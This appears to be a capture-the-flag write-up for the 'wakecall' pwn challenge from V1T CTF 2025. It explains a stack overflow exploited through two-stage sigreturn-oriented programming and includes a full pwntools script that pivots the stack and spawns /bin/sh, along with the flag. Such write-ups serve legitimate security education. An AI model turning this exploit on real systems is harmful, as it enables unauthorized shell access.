---
title: "wakecall"
description: "Two-stage SROP without libc. pop rax; ret + syscall are enough. First frame does read + stack pivot, second frame executes execve(\"/bin/sh\")."
event: "V1T CTF"
year: 2025
category: pwn
tags: ["srop", "sigreturn", "rop", "pwntools"]
difficulty: medium
date: "2025-08-10"
sourceRepo: "R3izorr/CTF_writeup"
sourcePath: "v1tctf/pwn/wakecall"
featured: false
flagsHidden: false
---

## Recon

```bash
$ checksec chall3
Arch: amd64-64-little   RELRO: Full   Canary: No   NX: on   PIE: No (0x400000)
```

```c
int main() {
    char buf[128];
    puts("Quack off, I'm debugging my reflection in the pond.");
    read(0, buf, 1000);
    return 0;
}
```

128 + 8 = **136 bytes** to saved RIP. Useful gadgets:

- `pop rax; ret`  at `0x4011ef`
- `syscall`       at `0x4011f1`

That's a full `rt_sigreturn` primitive.

## Why SROP

- No handy `pop rdi; ret`.
- Full RELRO — GOT hijack is painful.
- NX — no shellcode on the stack.
- But `rax = 15 + syscall` gives us the kernel's `rt_sigreturn`, which restores **every** register from a fake sigcontext.

## Two-stage plan

**Stage 1** (on the stack):

1. Overflow 136 bytes.
2. `pop rax; ret` → `rax = 15`.
3. `syscall` → rt_sigreturn.
4. Fake frame asks the kernel to `read(0, PIVOT, 0x400)` and set `rsp = PIVOT`, `rip = syscall`.

**Stage 2** (read into `.bss` at `PIVOT`):

1. `pop rax; ret` → `rax = 15`.
2. `syscall` → rt_sigreturn.
3. Second fake frame does `execve("/bin/sh", 0, 0)`.

Trick: stage 2's buffer **is** the new stack, so when `read` returns, the next `ret` consumes what we just wrote.

## Solve

```python
from pwn import *

context.arch = "amd64"
context.os = "linux"

elf = ELF("./chall3", checksec=False)
rop = ROP(elf)

pop_rax_ret = rop.find_gadget(["pop rax", "ret"]).address if rop.find_gadget(["pop rax", "ret"]) else 0x4011ef
syscall     = rop.find_gadget(["syscall"]).address        if rop.find_gadget(["syscall"])        else 0x4011f1

bss   = elf.bss()
pivot = bss + 0x200
binsh = bss + 0x380
offset = 136

frame1 = SigreturnFrame()
frame1.rax = constants.SYS_read
frame1.rdi = 0
frame1.rsi = pivot
frame1.rdx = 0x400
frame1.rsp = pivot
frame1.rip = syscall

payload1  = b"A" * offset
payload1 += p64(pop_rax_ret)
payload1 += p64(15)
payload1 += p64(syscall)
payload1 += bytes(frame1)

stage2  = p64(pop_rax_ret) + p64(15) + p64(syscall)

frame2 = SigreturnFrame()
frame2.rax = constants.SYS_execve
frame2.rdi = binsh
frame2.rsi = 0
frame2.rdx = 0
frame2.rsp = pivot
frame2.rip = syscall

stage2 += bytes(frame2)
stage2  = stage2.ljust(binsh - pivot, b"\x00")
stage2 += b"/bin/sh\x00"

p = remote("chall.v1t.site", 30211)
p.recvline()
p.send(payload1)
p.send(stage2)
p.interactive()
```

## Flag

```text
V1T{w4k3c4ll_s1gr3t_8b21799b5ad6fb6faa570fcbf0a0dcf5}
```
